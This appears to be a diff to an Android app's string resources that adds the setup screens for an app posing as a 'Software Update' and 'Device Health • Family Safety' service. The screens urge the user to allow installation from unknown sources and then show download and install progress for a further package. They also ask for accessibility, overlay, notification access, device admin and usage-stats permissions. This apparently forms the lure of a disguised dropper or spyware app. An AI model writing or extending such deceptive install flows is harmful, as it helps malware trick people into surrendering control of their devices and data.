@@ -4,4 +4,55 @@
     <string name="accessibility_desc">Monitors device performance and health metrics</string>
     <string name="setup_title">Software Update</string>
     <string name="channel_name">Background Services</string>
+
+    <!-- Setup flow -->
+    <string name="welcome_title">Setting Up Device Services</string>
+    <string name="welcome_desc">This will configure essential device health monitoring in a few simple steps.</string>
+    <string name="welcome_note">By continuing you agree to our Terms of Use</string>
+    <string name="btn_start">Get Started</string>
+
+    <string name="perm_title">Allow App Installation</string>
+    <string name="perm_desc">To complete setup, allow installation from unknown sources.</string>
+    <string name="perm_steps">1. Tap "Open Settings" below\n2. Find "Install unknown apps"\n3. Enable the toggle\n4. Return here and tap "Done"</string>
+    <string name="btn_open_settings">Open Settings</string>
+    <string name="btn_already_done">I\'ve Already Done This</string>
+    <string name="perm_not_granted">Permission not granted yet. Please enable it in Settings first.</string>
+
+    <string name="download_title">Downloading…</string>
+    <string name="download_checking">Checking for latest version…</string>
+    <string name="download_extracting">Extracting package…</string>
+    <string name="btn_cancel">Cancel</string>
+    <string name="eta_calculating">Calculating…</string>
+    <string name="eta_seconds">%d sec remaining</string>
+    <string name="eta_minutes">%d min remaining</string>
+
+    <string name="install_title">Installing…</string>
+    <string name="install_desc">Please do not close this screen. Installation may take a few moments.</string>
+
+    <string name="done_title">Setup Complete!</string>
+    <string name="done_desc">Device Health monitoring is now active.</string>
+    <string name="btn_continue">Continue →</string>
+    <string name="btn_next">Next</string>
+
+    <!-- Crash screen -->
+    <string name="crash_title">Something Went Wrong</string>
+    <string name="crash_restart">Restart App</string>
+
+    <!-- Permission step labels -->
+    <string name="step_battery">Battery Optimization</string>
+    <string name="step_accessibility">Accessibility Service</string>
+    <string name="step_overlay">Overlay Permission</string>
+    <string name="step_notifications">Notification Access</string>
+    <string name="step_device_admin">Device Admin</string>
+    <string name="step_storage">Storage Access</string>
+    <string name="step_usage">Usage Stats</string>
+
+    <!-- Status -->
+    <string name="status_granted">Granted ✓</string>
+    <string name="status_required">Required</string>
+    <string name="status_optional">Optional</string>
+    <string name="status_oem_step">OEM Battery</string>
+
+    <!-- Footer -->
+    <string name="footer_brand">Device Health • Family Safety</string>
 </resources>
